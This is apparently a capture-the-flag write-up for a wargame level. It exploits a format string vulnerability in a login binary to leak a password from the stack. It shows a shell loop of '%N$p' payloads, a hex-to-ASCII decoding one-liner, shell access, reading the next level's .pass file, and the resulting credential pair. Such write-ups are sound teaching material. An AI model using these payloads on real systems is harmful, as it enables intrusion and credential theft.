# Level02

> For introductory information on this operating system and binary securities, check [here](./analysis.md).

Using [`gdb`](https://linux.die.net/man/1/gdb), we can dig through the binary to understand what's going on (full analysis [here](./gdb.md)). This time we're facing a [format string attack](https://en.wikipedia.org/wiki/Uncontrolled_format_string) vulnerability. We know that the needed password to spawn a shell is `level03` password and since it is read before the vulnerable `printf()` call, this variable has to be somewhere on the stack. Using the vulnerability and a small script we can print out what's on the stack...



```shell
  $> for (( i = 1; i < 64; i++ )); do echo "$i - %$i\$p" | ./level02 | grep "does not have access" | cut -d ' ' -f3; done

  ...
  0x756e505234376848
  0x45414a3561733951
  0x377a7143574e6758
  0x354a35686e475873
  0x48336750664b394d
  ...  
```

We find those 5 promissing values but we need to convert them back into ASCII with a little twist, they're displayed in little-endian we need to convert it back to big-endian.

```shell
  $> python -c "print '756e505234376848'.decode('hex')[::-1] + '45414a3561733951'.decode('hex')[::-1] + '377a7143574e6758'.decode('hex')[::-1] + '354a35686e475873'.decode('hex')[::-1] + '48336750664b394d'.decode('hex')[::-1]"
  Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

Now if we try it, we can see it works like a charm!

```shell
  $> ./level02
  ===== [ Secure Access System v1.0 ] =====
  /***************************************\
  | You must login to access this system. |
  \**************************************/
  --[ Username: whatever
  --[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
  *****************************************
  Greetings, whatever!
  $ cat /home/users/level03/.pass
  Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

> Note that, the username is useless, you can put whatever you want.

So next user credentials pair is `level03:Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`.

Check [here](../source.c) for reproduction source-code of this binary.